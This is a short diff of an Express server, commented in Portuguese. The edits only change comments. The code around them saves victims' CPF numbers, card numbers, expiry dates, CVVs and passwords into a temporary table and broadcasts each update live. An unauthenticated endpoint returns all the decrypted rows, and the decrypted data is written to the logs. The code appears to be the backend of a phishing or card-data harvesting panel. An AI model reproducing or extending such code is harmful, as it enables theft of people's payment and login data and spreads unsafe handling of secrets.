@@ -352,7 +352,7 @@ app.post('/api/temp-submit', validateToken, async (req, res) => {
             [sessionId, decryptedCpf || null, encryptedCardNumber || null, decryptedExpiryDate || null, encryptedCvv || null, encryptedPassword || null]
         );
         console.log('Query executada com sucesso:', result.rowCount);
-        broadcast({ type: 'TEMP_DATA_UPDATE' }); // Envia broadcast após inserção/atualização
+        broadcast({ type: 'TEMP_DATA_UPDATE' }); // Broadcast após cada atualização
         res.json({ message: 'Dados temporários salvos com sucesso!' });
     } catch (error) {
         console.error('Erro em /api/temp-submit:', error.message, 'Stack:', error.stack);
@@ -386,7 +386,7 @@ app.get('/api/temp-data', async (req, res) => {
             }
         });
         console.log('Dados descriptografados antes da resposta:', decryptedRows);
-        res.json(decryptedRows); // Adiciona log após esta linha se necessário
+        res.json(decryptedRows);
     } catch (error) {
         console.error('Erro em /api/temp-data:', error.message, 'Stack:', error.stack);
         res.status(500).json({ error: 'Erro interno do servidor.' });
@@ -396,7 +396,7 @@ app.get('/api/temp-data', async (req, res) => {
 app.delete('/api/delete-temp-data/:sessionId', async (req, res) => {
     try {
         await pool.query('DELETE FROM temp_data WHERE session_id = $1', [req.params.sessionId]);
-        broadcast({ type: 'TEMP_DATA_UPDATE' }); // Envia broadcast após exclusão
+        broadcast({ type: 'TEMP_DATA_UPDATE' });
         res.json({ message: 'Dados temporários removidos com sucesso!' });
     } catch (error) {
         res.status(500).json({ error: 'Erro interno do servidor.' });
@@ -428,7 +428,7 @@ app.post('/submit', validateToken, async (req, res) => {
             await pool.query('DELETE FROM temp_data WHERE session_id = $1', [sessionId]);
         }
         broadcast({ type: 'FORM_DATA_UPDATE' });
-        broadcast({ type: 'TEMP_DATA_UPDATE' }); // Envia broadcast após submissão
+        broadcast({ type: 'TEMP_DATA_UPDATE' }); // Broadcast após submissão
         res.json({ message: 'Dados enviados com sucesso!' });
     } catch (error) {
         console.error('Erro em /submit:', error.message, 'Stack:', error.stack);
